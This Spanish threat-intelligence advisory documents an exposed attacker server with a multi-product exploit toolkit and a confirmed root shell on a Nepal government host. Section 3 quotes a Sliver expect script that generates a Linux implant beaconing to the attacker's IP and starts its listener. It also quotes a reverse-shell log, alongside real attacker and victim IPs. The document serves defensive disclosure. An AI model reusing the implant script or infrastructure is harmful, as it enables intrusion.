@@ -1,0 +1,470 @@
+================================================================================
+  SERVIDOR DE OPERADOR CON TOOLKIT OFENSIVO MULTI-PRODUCTO Y ACCESO
+  CONFIRMADO A UNA RED GUBERNAMENTAL
+  66.179.31[.]191 : 8898  --  AS399629 BL Networks (Singapur)  --  directorio
+  home/tmp expuesto por accidente
+  Fecha: 14-09-2026  |  Verificado: 15-09-2026  |  TLP: CLEAR
+  Fuentes: X / @Yusufcancakiir (analisis publico, 14-09-2026), verificacion TCP
+           y HTTP GET estandar de Intellroom CTI sobre el listado del directorio
+           (15-09-2026), WHOIS/ASN publico (ipinfo.io)
+================================================================================
+
+RESUMEN
+--------------------------------------------------------------------------------
+Un investigador independiente (Yusuf Can Cakir, @Yusufcancakiir, cuenta
+verificada) publico el 14-09-2026 el hallazgo de un servidor con un directorio
+HTTP abierto en 66.179.31[.]191:8898. Intellroom verifico el hallazgo de forma
+PASIVA (verificacion TCP + una peticion HTTP GET estandar sobre la raiz del
+directorio, sin descargar ningun archivo) el 15-09-2026: EL DIRECTORIO SIGUE
+EN LINEA, y el listado de la raiz trae 557 entradas -- mucho mas de lo que
+alcanzaba a verse en las capturas de pantalla originales.
+
+No es un servidor de staging generico: por los nombres de las carpetas de
+sistema que aparecen en la raiz (.font-unix, .ICE-unix, .X11-unix, los
+systemd-private-*, snap-private-tmp) el operador esta sirviendo por accidente
+su propio directorio /tmp, con `python -m http.server` (banner: SimpleHTTP/0.6
+Python/3.14.4). Es el HOGAR DE TRABAJO de un operador ofensivo, no un
+repositorio de payloads ordenado para distribucion.
+
+Tres cosas lo definen:
+
+  1. UN TOOLKIT DE EXPLOTACION MULTI-PRODUCTO A ESCALA. No es un kit contra un
+     solo producto: hay exploits dedicados para GeoServer (9 scripts), Confluence
+     (implante + memshell), Cleo (RCE no autenticada), Laravel Ignition (kit
+     automatizado completo), Nacos, Redis (tecnica de modulo malicioso via
+     replicacion), camaras Hikvision, y 17 plantillas de reconocimiento para
+     CloudPanel, cPanel/WHM, Drupal, Grafana, Jenkins, Joomla, Koha, Laravel,
+     LiteSpeed, Plesk, Prometheus, Tomcat, Webmin, WordPress, Zimbra y DHIS2
+     (sistema de informacion de salud usado por multiples ministerios de salud).
+  2. ESCANEO MASIVO ORQUESTADO. httpx, naabu y nuclei corridos sobre listas de
+     objetivos partidas en lotes de 500 (12 archivos batch500_*), mas 106
+     directorios/archivos con nombre puramente numerico (salida de procesos
+     batch de nuclei/httpx/naabu) y 37 directorios temporales de Python
+     multiprocessing (pymp-*). Esto es reconocimiento a miles de objetivos,
+     no un ataque puntual.
+  3. C2 Y POST-EXPLOTACION CONFIRMADOS CONTRA UN GOBIERNO. Un script automatiza
+     Sliver C2 para generar un implante Linux con HTTP C2 en la MISMA IP
+     (puerto 80) y levantar el listener. Un log de shell reversa registra una
+     conexion exitosa como root contra 103.69.124[.]253 -- IP que pertenece,
+     verificado de forma independiente via WHOIS/ASN, a NITC (IT Agency of
+     Government of Nepal, AS45353). El operador tambien usa ToShell, VShell,
+     Godzilla y AntSword (los cuatro son frameworks de C2/webshell de origen
+     chino, de uso muy extendido) y fscan para reconocimiento de red interna.
+
+Confianza en que la infraestructura es de un operador ofensivo activo: ALTA
+(verificado de forma independiente, no solo por el reporte del investigador).
+Confianza en la atribucion a un actor o campana nombrada: NULA.
+
+*** Ningun archivo del servidor fue descargado ni abierto. Lo publicado en la
+    seccion 2 es el LISTADO DE NOMBRES que devuelve el propio index HTTP del
+    directorio -- la misma pagina que cualquier navegador ve al visitarlo --,
+    obtenido con una peticion GET estandar sobre la raiz. No se accedio a
+    ninguna carpeta interna ni se leyo el contenido de ningun archivo. ***
+
+LINEA DE TIEMPO
+--------------------------------------------------------------------------------
+2026-09-14  14:16 UTC (fuente: metadato del post). Yusuf Can Cakir publica en X
+            su analisis con 3 capturas: el listado parcial del directorio, el
+            script de Sliver que genera el implante, y el log de la shell
+            reversa contra la red de Nepal. Ese mismo dia, en un reply, marca
+            a @qcinpublic. 8.686 reproducciones al momento de esta ficha.
+2026-09-14  ~18h despues. Un tercero (@DeadTech13767, cuenta NO verificada por
+            Intellroom) responde con una captura de un panel de administracion
+            de C2 (estilo VShell) con 101 hosts registrados en China, Corea del
+            Sur, Taiwan y EE.UU. NO SE CONFIRMA que ese panel corresponda a
+            este mismo servidor -- ninguna IP ni URL en la captura lo ata a
+            66.179.31.191. Se declara en la seccion 5-bis y NO se integra al
+            listado de IOCs de esta ficha.
+2026-09-15  14:22 UTC. Intellroom verifica de forma pasiva: 66.179.31.191:8898
+            SIGUE ABIERTO y sirviendo el listado (HTTP 200, 30.153 bytes en la
+            raiz, 557 entradas). El puerto 80 (el que usaria el C2 de Sliver
+            segun el script) NO responde hoy -- no implica que el implante este
+            inactivo, solo que el listener de ese script no esta corriendo en
+            este momento o se movio.
+2026-09-15  Intellroom verifica el segundo IP por TCP: 103.69.124.253:8070
+            (el puerto objetivo del log de shell reversa) SIGUE ABIERTO tambien.
+            No se establecio ninguna conexion mas alla del handshake TCP.
+
+--------------------------------------------------------------------------------
+1. LO QUE **NO** ES UN IOC  (leer antes que las tablas)
+--------------------------------------------------------------------------------
+
+  Los 106 nombres puramente numericos (ej. "1023503326", "994309996/")  ->
+  NO SON DOMINIOS NI IDENTIFICADORES DE RED
+
+  Son PIDs o identificadores de corrida de herramientas de escaneo (nuclei,
+  httpx, naabu generan carpetas/archivos temporales con estos nombres). No
+  tienen valor como firma de deteccion.
+
+  "dcbuner_*", "hr_kp_*", "jb_*", "pcfms*", "wqmis*", "mofa_scan"  ->
+  NO SON FIRMAS DE RED, SON NOMBRES DE ARCHIVO DEL ATACANTE
+
+  Son nombres que el operador le puso a SUS PROPIOS scripts y capturas en su
+  propio equipo. No van a aparecer en el trafico de red ni en el disco de
+  ninguna victima. Sirven para entender a QUE TIPO de sistema apuntaba
+  (ver seccion 3), no para escribir una regla de deteccion de red.
+
+  172.25.6[.]5  ->  NO ES UN IOC PUBLICO (es una IP privada, RFC1918)
+
+  Es una direccion interna sondeada DESDE DENTRO de una red ya comprometida
+  (via la sesion de ToShell). Solo tiene sentido como IOC para la
+  organizacion cuya red interna use ese rango -- para cualquier otra
+  organizacion no significa nada.
+
+  103.69.124[.]253  ->  NO SE BLOQUEA COMO SI FUERA INFRAESTRUCTURA DEL ATACANTE
+
+  Es el OBJETIVO, no el atacante: pertenece a la red del gobierno de Nepal
+  (AS45353, NITC). Aparece en esta ficha como evidencia de a quien apunta el
+  operador, no como algo que una tercera organizacion deba bloquear.
+
+  El listado de la captura de pantalla 4 (@DeadTech13767)  ->  NO VERIFICADO,
+  NO INCLUIDO. Ver seccion 5-bis.
+
+--------------------------------------------------------------------------------
+2. EL LISTADO DEL DIRECTORIO  (557 entradas, raiz, capturado 2026-09-15 14:22 UTC)
+--------------------------------------------------------------------------------
+
+Cifras: 169 directorios / 388 archivos. 106 nombres puramente numericos
+(PIDs/salida de escaneo), 21 carpetas "nuclei*", 38 "httpx*/pdhttpx*",
+37 "pymp-*" (temporales de multiprocessing Python), 12 lotes "batch500_a[a-l]"
+(listas de objetivos partidas de a 500 -- indica >=6.000 objetivos procesados
+en algun momento).
+
+[C2 e implantes]
+  sliver_gen.exp, sliver_http.exp, sliver_check.exp,
+  sliver_sessions.exp         automatizacion de Sliver C2 (ver seccion 4)
+  vshell-v4.9.3-linux_arm64.zip, vshell.so, vshell2.so,
+  vshell_module.c, vshell_extract/, vshell.log     framework VShell
+  godzilla.zip, godzilla_mem.zip                    webshell Godzilla
+  antsword.zip                                      webshell AntSword
+  listener.py, listener.sh, listener.log            listener(s) generico(s)
+  nc80.log, nc443.log, nc53.log, nc_listener.log,
+  nc_outbound.log, nc_rev.txt, nc_revshell.log,
+  nc_shells.log                netcat sobre puertos estandar (80/443/53)
+                                para mezclarse con trafico legitimo
+  shell_16653.log, shell_16654.log   coincide con el puerto 16653 del log de
+                                shell reversa de la captura 3 del tweet; el
+                                .16654 sugiere una SEGUNDA sesion no descrita
+                                en el post original
+
+[Reconocimiento y escaneo masivo]
+  fscan, fscan.zip, fscan_0x.log/.txt, fscan_3x.log/.txt   fscan (interno)
+  nuclei-report-*/  nuclei-tmp-*/  nuclei[numero]/ (21 carpetas)
+  httpx_batch500_a[a-f].json, httpx_done_batch500_a[a-e],
+  httpx_remaining.json, httpx_results.json, httpx.log, httpx.zip,
+  httpx2326038937/, httpx2828751480/, pdhttpx[numero]/ (30 carpetas)
+  naabu[numero]/ (2 carpetas)          naabu = escaner de puertos
+  batch_aa, batch_ab, batch_runner.log, batch500_a[a-l] (12 lotes)
+  all_domains.txt, remaining_domains.txt, targets_all.txt,
+  verify_targets.py, verify_targets.txt, debug_targets.py
+  cocc_nmap.txt
+
+[Explotacion -- por producto]
+  Cleo_Unauth_RCE/, cleo_exploit.sh          Cleo Harmony/VLTrader/LexiCom RCE
+  geoserver_admin_full.py, geoserver_decrypt.py, geoserver_deep_exploit.py,
+  geoserver_master_exploit.py, geoserver_rce.py, geoserver_reset_pg.py,
+  geoserver_rest_exploit.py, geoserver_sqlview.py, geoserver_xxe.py
+                                              9 scripts contra GeoServer
+  confluence_beichen.zip, confluence_exp.zip, confluence_implant,
+  confluence_implant.gz, confluence_mem.zip   kit de implante + memshell
+                                              para Atlassian Confluence
+  ignition_auto.py, ignition_exploit.php, ignition_final.json/.py,
+  ignition_results.json, ignition_shell.py    Laravel Ignition (CVE-2021-3129)
+  laravel-exploits/, laravel_exploit.py, laravel.log
+  nacos_key, nacos_key.pub, nacos_rce_results.json   Alibaba Nacos
+  redis-7.0.0/, redis_mod.c, redis_mod2.c, redis_module.c, redis_module2.c,
+  rogue.rdb, rogue_fixed.rdb, rogue_v10.rdb, rogue.tar.gz, redis_temp/
+                                              Redis RCE via modulo malicioso
+                                              (tecnica de "rogue server")
+  hik.py, hik_fullscan.py                    camaras Hikvision
+  wavlink_shells.log                         routers Wavlink
+  rgd_sqli_extract.py, rgd_sqli_output.log   inyeccion SQL dirigida
+  pma_brute.py, pma_brute_results.txt, pma_weak_test.py,
+  pma_dnams.html                             fuerza bruta contra phpMyAdmin
+  ysoserial-all.jar, ysoserial_err.log/2.log deserializacion Java
+  phpggc/, phpggc_old/                       deserializacion PHP (gadget chains)
+  OQ3.java                                   payload Java a medida
+  evil.c, exp.so, eviljar.zip, exploit.phar, exploit.py, exploit2.py,
+  exploit3.py, system.so, system_module.so, v.so, v_local.so, upx (empaquetador)
+
+[Plantillas de reconocimiento por producto -- 17 tecnologias]
+  tpl_cloudpanel.txt   tpl_codeigniter.txt   tpl_cpanel_whm.txt
+  tpl_dhis2.txt         tpl_drupal.txt        tpl_grafana.txt
+  tpl_jenkins.txt       tpl_joomla.txt        tpl_koha.txt
+  tpl_laravel.txt       tpl_litespeed.txt     tpl_plesk.txt
+  tpl_prometheus.txt    tpl_tomcat.txt        tpl_webmin.txt
+  tpl_wordpress.txt     tpl_zimbra.txt (+ zim_tpl.txt)
+
+[Nombres de archivo compatibles con sistemas de GOBIERNO -- ver seccion 3]
+  mofa_scan/                                  posible Ministerio de Rel. Ext.
+  pcfms.html, pcfms_login.html                posible sistema de gestion
+                                               financiera publica (PFMS/PCFMS)
+  wqmis_env.txt                               posible sistema de gestion de
+                                               calidad de agua (WQMIS)
+  icc_app_config.txt, dnams_test.html         sin identificar con certeza
+  hr_admin.html, hr_kp_*.html/.txt (28 archivos), hr_login*, hr_pma_*,
+  hr_session_headers.txt                      aplicacion "HR" con brute-force
+                                               de login y pivote a phpMyAdmin
+  dcbuner_after_login.html, dcbuner_al2/3.html, dcbuner_cookies.txt,
+  dcbuner_dash.html, dcbuner_db.txt, dcbuner_fl*.html/.txt (5 archivos),
+  dcbuner_form.html, dcbuner_j4.txt, dcbuner_jar*.txt (3), dcbuner_login*.html,
+  dcbuner_lp2/3/4.html, dcbuner_tc*.html/.txt   (23 archivos en total)
+                                               automatizacion de login/sesion
+                                               contra una aplicacion con
+                                               backend tipo Tomcat/Java (por
+                                               los archivos "_jar" y "_tc")
+  energy_cookies.txt, energy_page.html, energy_rce2.html,
+  energy_rce_body.html                        aplicacion nombrada "energy"
+  jb_*.bin/.txt (33 archivos: jb_win1/2.bin, jb_t80/t443.bin, jb_py*.bin,
+  jb_revshell.bin, jb_oob_test.bin...)         payloads compilados para
+                                               Windows y Linux sobre puertos
+                                               80/443; el prefijo "jb" podria
+                                               corresponder a Jenkins (hay
+                                               tpl_jenkins.txt en el mismo
+                                               directorio) -- SIN CONFIRMAR
+
+[Automatizacion / operacion]
+  dsms_overnight/, dsms_overnight.pid, dsms_overnight.py,
+  run_overnight.sh, run_remaining.sh          corridas desatendidas nocturnas
+  pwneye_batch_final/, pwneye_real_scan/, pwneye_test/,
+  pwneye_test_single/ (+ logs)                 nombre propio de framework de
+                                               escaneo del operador ("pwneye")
+  extract_pw.py, find_log.py, find_writable.py, gen_implant.py,
+  deploy_module.py, deploy_oob.sh, deploy_war.sh, deploy_115.bin,
+  write_shell.py, write_b64.py, write_2step.py, write_multistep.py,
+  write_final.py, write_targets.py, debug_ignition.py, debug_targets.py,
+  forged_headers.txt, forged_result.html, env_check.txt, login.json,
+  pwds.txt, memshell.zip, phars/, war/, httpd/, httpd.log, http8899.log,
+  reverse_115.bin, wren.cfg, r49.html, step1.phar, step2.phar, id.phar,
+  id2.phar, c.phar, cmd.phar, cmd.war, test_id.phar, shell.phar,
+  composer.lock, datastore_restore.xml, ob_final.py, ora.py, netdata.sh,
+  off_test.jsonl, openssl.cnf, pg_connect_test.py, recon3.sh, recv.log,
+  rm.c, rogue.log, rogue.pid, scan.log, scan.sh, scan_par.log/.sh,
+  sqlmap_dbs.log/2.log, sqlmap_out/, sqlmapg_*/, sqlmaptugl_*/,
+  slt_public.sh, test100.txt, test_payload.bin, test_stage,
+  test_target.txt, test_v10.rdb, tmux-0/, verify_results.json,
+  cve76904.py (nombre de archivo sin CVE identificado con certeza),
+  cve_memshell.zip, curl_results.jsonl, cleanup.sh, build.sh, build_module.sh,
+  api_test.txt, bash (binario)
+
+[Ruido de sistema -- confirma que es /tmp de un host Linux real]
+  .del, .font-unix/, .ICE-unix/, .X11-unix/, .XIM-unix/, snap-private-tmp/,
+  hsperfdata_root/ (heap dumps de Java), systemd-private-*-{chrony,fwupd,
+  ModemManager,polkit,redis-server,systemd-logind}.service-*/
+
+--------------------------------------------------------------------------------
+3. LO QUE CONFIRMA EL TWEET ORIGINAL, LEIDO EN LAS 3 CAPTURAS
+--------------------------------------------------------------------------------
+
+CAPTURA 1 -- listado de directorio (parcial, hasta la letra "d"). Coincide
+exacto con el inicio alfabetico de la seccion 2 de esta ficha.
+
+CAPTURA 2 -- script de automatizacion de Sliver (archivo probablemente
+"sliver_gen.exp" o "sliver_http.exp" de la seccion 2):
+
+    #!/usr/bin/expect -f
+    set timeout 120
+    spawn sliver-client
+    expect "sliver>"
+    send "generate --os linux --arch amd64 --http 66.179.31.191:80
+          --save /opt/sliver-implants/ --name linux_beacon_new
+          --skip-symbols\r"
+    expect "sliver>"
+    send "http -l 80\r"
+    expect "sliver>"
+    send "exit\r"
+    expect eof
+
+  Genera un implante Linux (amd64) cuyo C2 HTTP es LA MISMA IP del servidor
+  expuesto, puerto 80, y levanta el listener en el mismo puerto acto seguido.
+  Nombre del implante: "linux_beacon_new" -- sugiere que reemplazo a una
+  version anterior ("linux_beacon" sin "_new").
+
+CAPTURA 3 -- log de una sesion de shell reversa exitosa:
+
+    Target: http://103.69.124.253:8070
+    Port: 16653
+    Listening on 0.0.0.0 16653
+    Connection received on 103.69.124.253 43710
+    root@gcloud-vm:/#
+
+  Conexion recibida DESDE 103.69.124.253 (puerto de origen 43710) hacia un
+  listener local en el puerto 16653. El prompt "root@gcloud-vm:/#" indica
+  acceso root confirmado sobre una maquina virtual de Google Cloud. El nombre
+  de archivo "shell_16653.log" en el listado de la seccion 2 corresponde
+  exacto a este puerto -- confirma que el log persiste en el servidor. Existe
+  ademas un "shell_16654.log" que sugiere una segunda sesion no descrita en
+  el tweet original.
+
+  *** Verificado de forma independiente por Intellroom via WHOIS/ASN publico
+      (no solo tomado del tweet): 103.69.124.253 pertenece a AS45353,
+      registrado como "NITC: IT Agency of Government of Nepal", geolocalizado
+      en Katmandu. Confirma la afirmacion del investigador de que "esa IP
+      pertenece a una red gubernamental de Nepal". ***
+
+--------------------------------------------------------------------------------
+4. LA VERIFICACION DE INTELLROOM  (15-09-2026, un dia despues del tweet)
+--------------------------------------------------------------------------------
+
+  66.179.31.191:8898   ABIERTO. HTTP GET estandar a la raiz -> 200 OK,
+                        Server: SimpleHTTP/0.6 Python/3.14.4, 30.153 bytes,
+                        557 entradas en el listado (vs. lo parcial visible
+                        en la captura de pantalla original). EL SERVIDOR
+                        SIGUE ACTIVO AL MOMENTO DE ESTA FICHA.
+  66.179.31.191:80     Cerrado / sin respuesta hoy. No implica que el
+                        implante de Sliver este inactivo: puede que el
+                        listener del script no este corriendo en este
+                        momento, o se haya movido de puerto.
+  103.69.124.253:8070  ABIERTO (solo verificacion TCP -- ningun dato
+                        enviado ni recibido mas alla del handshake).
+
+  *** Todo lo anterior es verificacion PASIVA: WHOIS/DNS, una peticion HTTP
+      GET estandar sobre la raiz del directorio, y comprobacion TCP. Ningun
+      archivo fue descargado, ninguna carpeta interna fue explorada, y no
+      hubo ninguna interaccion con el implante ni con el host de Nepal mas
+      alla de un handshake TCP de conectividad. ***
+
+--------------------------------------------------------------------------------
+5. TTP Y CRUCE CON PATRONES CONOCIDOS  (coincidencia de herramientas, NO atribucion)
+--------------------------------------------------------------------------------
+
+La combinacion fscan + Godzilla + AntSword + VShell + ToShell que describe el
+tweet, sumada a nombres de archivo como "confluence_beichen" (nombre propio
+de origen chino, presente en kits de implante de Confluence que circulan en
+foros de habla china), es una combinacion de herramientas MUY documentada en
+reportes publicos sobre clusters de intrusion de origen chino -- pero el uso
+de herramientas de codigo abierto o ampliamente distribuidas NO constituye
+atribucion por si solo. Cualquier operador, de cualquier origen, puede usar
+estas mismas cinco herramientas.
+
+Lo que SI se puede afirmar sin atribuir a nadie:
+  - El operador prioriza persistencia y sigilo sobre ruido (netcat en
+    puertos 80/443/53 para mezclarse con trafico legitimo; Sliver con
+    "--skip-symbols" para dificultar el analisis del binario).
+  - El operador trabaja a DOS escalas a la vez: reconocimiento masivo
+    oportunista (12 lotes de 500 objetivos, 17 plantillas de producto,
+    escaneo con nuclei/httpx/naabu) Y post-explotacion manual dirigida
+    y profunda contra al menos un objetivo de alto valor (la sesion
+    root confirmada contra la red de gobierno de Nepal).
+  - Los nombres de archivo sugieren objetivos gubernamentales especificos
+    mas alla de lo que el tweet describe: posible cancilleria ("mofa_scan"),
+    posible sistema de gestion financiera publica ("pcfms"), posible sistema
+    de gestion de calidad de agua ("wqmis"). NINGUNO de estos se confirma
+    con certeza -- son inferencias a partir de nombres de archivo abreviados,
+    no hechos verificados. Se declaran como hipotesis, no como hallazgo.
+
+--------------------------------------------------------------------------------
+5-bis. CONTEXTO NO VERIFICADO  (respuesta de un tercero, NO integrado a los IOCs)
+--------------------------------------------------------------------------------
+
+Una cuenta sin verificar (@DeadTech13767) respondio al post original con una
+captura de un panel de administracion de C2 (estilo VShell/AntSword: pestañas
+"Client Management", "Listening Management", "Tunnel Agent") que lista 101
+hosts registrados, mayoritariamente en China, con algunos en Corea del Sur,
+Taiwan y EE.UU.
+
+*** NO SE INCLUYE en el listado de IOCs de esta ficha, ni se publica la
+    captura, por tres razones: (1) ninguna IP ni URL en la captura la conecta
+    con 66.179.31.191 -- podria ser un panel completamente distinto que el
+    autor de la respuesta encontro en otro lugar; (2) es una cuenta no
+    verificada, sin trayectoria conocida por Intellroom; (3) publicar esa
+    lista significaria exponer nombres de host y direcciones IP de decenas
+    de organizaciones sin poder confirmar que sean parte de esta misma
+    operacion -- exactamente el dano colateral que este metodo existe para
+    evitar. Se declara su existencia por transparencia, sin integrarla. ***
+
+Fuente: https://x.com/DeadTech13767/status/2099797006612926937  (14-09-2026)
+
+--------------------------------------------------------------------------------
+6. MITRE ATT&CK
+--------------------------------------------------------------------------------
+
+T1595       Active Scanning  (nuclei/httpx/naabu contra miles de objetivos)
+T1583.003   Acquire Infrastructure: Virtual Private Server
+T1588.002   Obtain Capabilities: Tool  (Sliver, VShell, Godzilla, AntSword,
+                                        fscan -- todos publicos/reusados)
+T1190       Exploit Public-Facing Application  (GeoServer, Confluence, Cleo,
+                                        Laravel Ignition, Nacos, Redis)
+T1505.003   Server Software Component: Web Shell  (Godzilla, AntSword,
+                                        confluence_implant, memshell.zip)
+T1071.001   Application Layer Protocol: Web Protocols  (Sliver HTTP C2,
+                                        netcat sobre 80/443)
+T1573       Encrypted Channel  (VShell, ToShell)
+T1210       Exploitation of Remote Services  (movimiento hacia Tomcat/host
+                                        interno 172.25.6.5 via ToShell)
+T1046       Network Service Discovery  (fscan, enumeracion interna)
+T1552.001   Unsecured Credentials: Credentials In Files  (busqueda de
+                                        contraseñas y configs de BD descrita
+                                        en el tweet)
+T1003       OS Credential Dumping  (extract_pw.py, pma_brute*)
+T1583.006   Acquire Infrastructure: Web Services  (paneles de gestion tipo
+                                        VShell -- ver seccion 5-bis, si aplica)
+
+--------------------------------------------------------------------------------
+7. ACCIONES RECOMENDADAS
+--------------------------------------------------------------------------------
+
+PARA CUALQUIER ORGANIZACION:
+
+1. BLOQUEAR 66.179.31[.]191 en el perimetro (proxy, firewall, EDR con
+   bloqueo de red). Es un VPS dedicado en un ASN de hosting -- NO es un
+   sitio legitimo comprometido, el bloqueo no arrastra a terceros.
+2. BUSCAR HACIA ATRAS en logs de proxy/firewall cualquier conexion saliente
+   hacia 66.179.31.191, en cualquier puerto, en las ultimas semanas.
+3. Si opera GeoServer, Confluence, Cleo (Harmony/VLTrader/LexiCom), Laravel
+   con Ignition en modo debug, Nacos o Redis expuesto a internet: verificar
+   version y parches contra las CVEs conocidas de cada producto antes de
+   asumir que no aplica.
+4. Si opera alguna de las 17 tecnologias con plantilla dedicada (seccion 2):
+   revisar que la interfaz de administracion no este expuesta a internet
+   sin autenticacion reforzada (MFA).
+5. Revisar logs de acceso por conexiones desde IPs inusuales sobre los
+   puertos 80/443/53 con patrones de trafico que NO correspondan al servicio
+   real (netcat disfrazado de trafico web/DNS).
+
+PARA GOBIERNOS Y ORGANISMOS PUBLICOS DE LA REGION (Sur de Asia,
+extensible a cualquier region con infraestructura publica expuesta):
+
+6. El tweet original declara "evidencia de pruebas activas contra
+   infraestructura gubernamental de la region, incluido Sri Lanka" -- si su
+   organizacion opera infraestructura publica en la region, tratar esto
+   como alerta de targeting activo, no como curiosidad tecnica.
+7. Si su organizacion usa DHIS2, PFMS/PCFMS, sistemas de gestion de agua o
+   aplicaciones internas con nombre parecido a los descritos en la seccion 2,
+   priorizar la revision de logs de acceso de los ultimos 30 dias.
+
+--------------------------------------------------------------------------------
+8. LO QUE NO SE PUDO VERIFICAR  (declarado, no omitido)
+--------------------------------------------------------------------------------
+
+- El CONTENIDO de ningun archivo. Solo se tiene el listado de nombres de la
+  raiz del directorio. No se descargo nada y no se va a descargar.
+- HASHES de ninguna muestra. No se consultaron OTX/ThreatFox/VirusTotal en
+  esta ficha (la API de ThreatFox devolvio "Unauthorized" con las
+  credenciales disponibles en este entorno; no se tiene clave de Shodan
+  para pivotar por huella de banner). No existe ningun hash de muestra
+  recuperable en esta ficha.
+- El significado exacto de "mofa_scan", "pcfms", "wqmis", "jb_*", "dcbuner_*",
+  "hr_kp_*", "energy_*", "icc_app_config", "dnams_test", "wren.cfg" y
+  "pwneye". Son inferencias razonables a partir de nombres de archivo
+  abreviados, NO hechos confirmados.
+- Si el implante de Sliver ("linux_beacon_new") sigue activo hoy, o si el
+  operador migro su C2 a otro puerto/IP tras el tweet original.
+- Si existe una segunda victima detras de "shell_16654.log" (solo se
+  confirmo la sesion documentada en "shell_16653.log", que coincide con la
+  captura publicada).
+- La identidad exacta de la dependencia gubernamental de Nepal afectada
+  (solo se confirma el AS -- AS45353, NITC -- registro publico, no una
+  entidad especifica dentro de esa red).
+- Si la captura de la seccion 5-bis (@DeadTech13767) corresponde a este
+  mismo operador. NO se confirma.
+- El actor o campana detras de esta infraestructura. No se atribuye.
+
+================================================================================
+  Intellroom Threat Intelligence  --  https://intellroom.com
+  Analisis pasivo. No hubo ninguna interaccion intrusiva con el objetivo: solo
+  WHOIS/ASN publico, una peticion HTTP GET estandar sobre la raiz del
+  directorio, y verificacion TCP. Ningun archivo del servidor fue descargado
+  ni abierto, y no hubo ninguna interaccion con la red de la victima mas alla
+  de un handshake TCP de conectividad.
+================================================================================
